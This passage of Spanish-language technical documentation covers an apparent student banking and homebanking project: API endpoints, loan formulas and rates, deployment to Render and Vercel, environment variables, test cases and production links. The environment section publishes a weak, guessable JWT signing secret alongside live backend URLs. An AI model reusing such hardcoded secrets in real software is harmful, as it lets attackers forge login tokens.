GET    /analytics/mora-bands                    # Distribución mora
GET    /analytics/cartera-activa               # Créditos activos
GET    /analytics/powerbi-resumen              # Datos Power BI Hoja 1
GET    /analytics/powerbi-mora                 # Datos Power BI Hoja 2

POST   /api/ahorros/apertura                   # Apertura de cuenta
POST   /api/ahorros/depositar                  # Depósito
POST   /api/ahorros/retirar                    # Retiro
POST   /api/ahorros/cierre-diario-ahorros      # Cierre diario TREA
```

---

## 15. FÓRMULAS FINANCIERAS Y TARIFARIO

### Conversión TEA → TEM
```
TEM = (1 + TEA)^(1/12) - 1
```
*Ejemplo con TEA = 18%:*  
`TEM = (1.18)^(1/12) - 1 = 0.01389 = 1.389% mensual`

### Cuota Fija (Sistema Francés)
```
C = M × [TEM × (1 + TEM)^n] / [(1 + TEM)^n - 1]
```
*Donde: M = Monto del préstamo, n = Plazo en meses*

### Ratio Deuda-Sueldo (RDS)
```
RDS = Cuota Mensual / Ingreso Mensual
```

### Interés Moratorio Diario
```
Mora_Diaria = Monto_Cuota × (Tasa_Moratoria_Anual / 100 / 360)
```

### Tarifario de Productos Activos (Créditos)
| Producto | TEA Mín. | TEA Máx. | T. Mora | Seguro Desgravamen |
|---|---|---|---|---|
| Crédito Efectivo Personal | 14.50% | 28.00% | 5.00% | 0.085% mensual s/saldo |
| Crédito PYME Comercial | 15.00% | 22.00% | 6.00% | 0.095% mensual s/saldo |
| Crédito Empresarial Micro (c/seguro) | 40.92% | 40.92% | 8.00% | Incluido |
| Crédito Empresarial Micro (s/seguro) | 43.92% | 43.92% | 8.00% | No aplica |
| Tarjeta de Crédito CMR | 18.00% | 35.00% | 5.00% | 0.080% mensual s/saldo |

---

## 16. GUÍA DE DESPLIEGUE EN PRODUCCIÓN

### Render.com (Backends)

El archivo `render.yaml` en la raíz del proyecto configura ambos backends automáticamente.

```yaml
services:
  - name: portal-backend
    env: python
    rootDir: portal-backend
    buildCommand: pip install -r requirements.txt
    startCommand: uvicorn app.main:app --host 0.0.0.0 --port $PORT

  - name: core-backend
    env: python
    rootDir: core-backend
    buildCommand: pip install -r requirements.txt
    startCommand: uvicorn app.main:app --host 0.0.0.0 --port $PORT
```

### Vercel (Frontends)

Cada frontend tiene su propio proyecto en Vercel con:
- **Framework:** Vite
- **Build Command:** `npm run build`
- **Output Directory:** `dist`
- **Variable de entorno:** `VITE_API_URL` apuntando al backend correspondiente en Render.

### Proceso de Despliegue

1. Hacer `git push origin main` en el repositorio.
2. Render detecta el push y re-despliega ambos backends automáticamente.
3. Vercel detecta el push y re-despliega ambos frontends automáticamente.
4. Las tablas de BD se crean/actualizan automáticamente al inicio del backend (`Base.metadata.create_all()`).

---

## 17. VARIABLES DE ENTORNO

### Portal Backend (`portal-backend/.env`)
```env
DATABASE_URL=postgresql://neondb_owner:...@ep-twilight-water...neon.tech/neondb?sslmode=require
SECRET_KEY=clave_super_secreta_para_jwt
FRONTEND_URLS=https://proyecto-falabella-tornero-ja2i.vercel.app
CORE_API_URL=https://core-backend-g43c.onrender.com
```

### Core Backend (`core-backend/.env`)
```env
DATABASE_URL=postgresql://neondb_owner:...@ep-twilight-water...neon.tech/neondb?sslmode=require
SECRET_KEY=clave_super_secreta_para_jwt
FRONTEND_URLS=https://proyecto-falabella-tornero-nqff.vercel.app
```

### Portal Frontend (Vercel)
```env
VITE_API_URL=https://[portal-backend-url].onrender.com
```

### Core Frontend (Vercel)
```env
VITE_API_URL=https://core-backend-g43c.onrender.com
```

---

## 18. CASOS DE PRUEBA END-TO-END

### 🧪 Caso 1: Registro y Login de Cliente
```
1. POST /api/auth/register
   Body: { "nombre": "Ana", "apellido": "García", "dni": "12345678",
           "email": "ana@gmail.com", "password": "Banco2025!" }
   Resultado esperado: 200 OK + { "mensaje": "Usuario registrado" }

2. POST /api/auth/login
   Body: { "dni": "12345678", "password": "Banco2025!" }
   Resultado esperado: 200 OK + { "access_token": "eyJ...", "token_type": "bearer" }
```

### 🧪 Caso 2: Solicitar Crédito → Aprobación Automática
```
1. POST /api/creditos/
   Auth: Bearer {token_cliente}
   Body: { "usuario_id": "{id}", "monto_solicitado": 5000,
           "plazo_meses": 12, "tipo_producto": "personal" }
   Resultado esperado: { "estado": "aprobado_automatico", "score": 780, "rds_semaforo": "verde" }

2. GET /api/creditos/{credito_id}/cronograma
   Resultado esperado: Lista de 12 cuotas con monto_cuota y fecha_vencimiento
```

### 🧪 Caso 3: Transferencia entre Cuentas
```
1. POST /api/transferencias/
   Auth: Bearer {token}
   Body: { "cuenta_origen_id": 1, "numero_cuenta_destino": "BF3A4F...",
           "monto": 500, "descripcion": "Pago de deuda" }
   Resultado esperado: { "mensaje": "Transferencia realizada correctamente" }

2. GET /api/ahorros/movimientos/{cuenta_id}
   Resultado esperado: Primer movimiento de tipo "transferencia" con monto 500
```

### 🧪 Caso 4: Trabajador Aprueba Crédito en Revisión
```
1. POST /auth/login (Core)
   Body: { "codigo_empleado": "CORE-001", "password": "..." }

2. GET /scoring/bandeja
   Resultado: Lista de créditos con estado "en_revision"

3. PUT /scoring/bandeja/{credito_id}
   Auth: Bearer {token_trabajador}
   Body: { "estado": "aprobado", "comentario": "Aprobado por analista" }
   Resultado esperado: { "mensaje": "Crédito aprobado exitosamente" }
```

### 🧪 Caso 5: Derivación a Proceso Judicial
```
1. PUT /api/mora/{credito_id}/transicion
   Auth: Bearer {token_riesgos_o_superior}
   Body: { "banda_destino": "judicial", "comentario": "125 días sin pago" }
   
   Validaciones del sistema:
   - ✅ dias_mora >= 121 (cumple)
   - ✅ rol del trabajador >= "riesgos" (cumple)
   Resultado esperado: { "banda_mora": "judicial", "ejecutado_por": "Ana Ríos" }
```

---

## 🌐 ENLACES DE PRODUCCIÓN

| Sistema | URL | Estado |
|---|---|---|
| Portal Homebanking (Clientes) | https://proyecto-falabella-tornero-ja2i.vercel.app | ✅ Activo |
| Core Bancario (Analistas) | https://proyecto-falabella-tornero-nqff.vercel.app | ✅ Activo |
| Portal Backend API | https://portal-backend-k4ak.onrender.com | ✅ Activo |
| Core Backend API | https://core-backend-g43c.onrender.com | ✅ Activo |
| Repositorio GitHub | https://github.com/DiegoTornero/proyecto_Falabella_Tornero | ✅ Público |

---

*Documentación técnica elaborada para el Sistema Core Bancario & Homebanking de Banco Falabella — Versión 2.0.0*  
*Actualizada: Junio 2026*
